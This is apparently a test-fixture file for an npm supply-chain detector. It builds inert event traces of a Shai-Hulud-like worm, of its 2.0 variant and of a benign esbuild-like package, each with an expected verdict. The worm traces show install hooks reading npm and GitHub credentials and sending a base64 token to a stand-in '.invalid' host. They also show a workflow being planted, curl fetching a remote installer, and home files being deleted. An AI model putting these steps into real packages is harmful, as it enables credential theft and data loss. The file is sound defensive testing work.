// Hand-written traces that model real attacks and a normal package. They are data only: nothing
// here runs anything. Domains use .invalid (RFC 2606), which never resolves.

import { fakeTokens, HOME, NODE_MODULES, npmInstall, PROJECT } from "./builders.js";
import { refBase64 } from "./reference-encoders.js";

/**
 * Shai-Hulud-like worm: preinstall reads ~/.npmrc and the GitHub CLI config, forks a detached
 * process, and that process (after npm has exited) sends base64(JSON) containing the npm token to
 * an unknown host, and plants a GitHub Actions workflow in the project.
 * Expected: MALICIOUS with R1, R2, R3, R6, R10.
 */
export function wormScenario() {
  return npmInstall((t) => {
    t.exec(201, 100, "/bin/sh", ["sh", "-c", "node setup.js"]);
    t.exec(202, 201, "/usr/local/bin/node", ["node", "setup.js"]);
    t.read(202, `${HOME}/.npmrc`, 201);
    t.read(202, `${HOME}/.config/gh/hosts.yml`, 201);
    t.exec(203, 202, "/usr/local/bin/node", ["node", "setup.js", "--detached"]);
    t.exit(202, 0, 201);
    t.exit(201, 0, 100);
  })
    .inPhase("linger")
    .dns("exfil.sietch-demo.invalid")
    .connect(203, "10.89.0.2", 443, 202)
    .http(
      "POST",
      "exfil.sietch-demo.invalid",
      "/collect",
      refBase64(JSON.stringify({ host: "dev", npm: fakeTokens.npm() })),
    )
    .write(203, "create", `${PROJECT}/.github/workflows/discussion.yaml`, undefined, 202)
    .build();
}

/**
 * esbuild-like normal package: postinstall downloads its platform binary from the registry
 * (allowlisted), writes it inside node_modules, makes it executable, runs it once to check the
 * version, and every process exits before the install finishes. Expected: SAFE, no findings.
 */
export function esbuildLikeScenario() {
  const bin = `${NODE_MODULES}/esbuild/bin/esbuild`;
  return npmInstall((t) => {
    t.exec(301, 100, "/bin/sh", ["sh", "-c", "node install.js"]);
    t.exec(302, 301, "/usr/local/bin/node", ["node", "install.js"]);
    t.read(302, `${NODE_MODULES}/esbuild/package.json`, 301);
    t.dns("registry.npmjs.org");
    t.connect(302, "10.89.0.2", 443, 301);
    t.http("GET", "registry.npmjs.org", "/@esbuild/linux-arm64/-/linux-arm64-0.25.0.tgz");
    t.write(302, "create", `/tmp/esbuild-${"a".repeat(8)}.tgz`, undefined, 301);
    t.write(302, "create", bin, undefined, 301);
    t.write(302, "chmod", bin, undefined, 301);
    t.exec(303, 302, bin, [bin, "--version"]);
    t.exit(303, 0, 302);
    t.write(302, "delete", `/tmp/esbuild-${"a".repeat(8)}.tgz`, undefined, 301);
    t.exit(302, 0, 301);
    t.exit(301, 0, 100);
  })
    .inPhase("load")
    .exec(400, 1, "/usr/local/bin/node", ["node", "/sietch/harness.js", "esbuild"])
    .read(400, `${NODE_MODULES}/esbuild/lib/main.js`)
    .exit(400)
    .build();
}

/**
 * Shai-Hulud 2.0-like: preinstall downloads Bun into the home directory and runs it, uses curl,
 * and wipes 25 files in the home directory. Expected: MALICIOUS with R4, R5, R9 (and R3, R6).
 */
export function shaiHulud2Scenario() {
  return npmInstall((t) => {
    t.exec(501, 100, "/bin/sh", ["sh", "-c", "node setup_bun.js"]);
    t.exec(502, 501, "/usr/local/bin/node", ["node", "setup_bun.js"]);
    t.exec(503, 502, "/usr/bin/curl", ["curl", "-fsSL", "https://bun.sietch-demo.invalid/install"]);
    t.dns("bun.sietch-demo.invalid");
    t.exit(503, 0, 502);
    t.write(502, "create", `${HOME}/.bun/bin/bun`, undefined, 501);
    t.write(502, "chmod", `${HOME}/.bun/bin/bun`, undefined, 501);
    t.exec(504, 502, `${HOME}/.bun/bin/bun`, ["bun", "bun_environment.js"]);
    for (let i = 0; i < 25; i++) t.write(504, "delete", `${HOME}/projects/file-${i}.txt`, undefined, 502);
    t.exit(504, 0, 502);
    t.exit(502, 0, 501);
    t.exit(501, 0, 100);
  }).build();
}
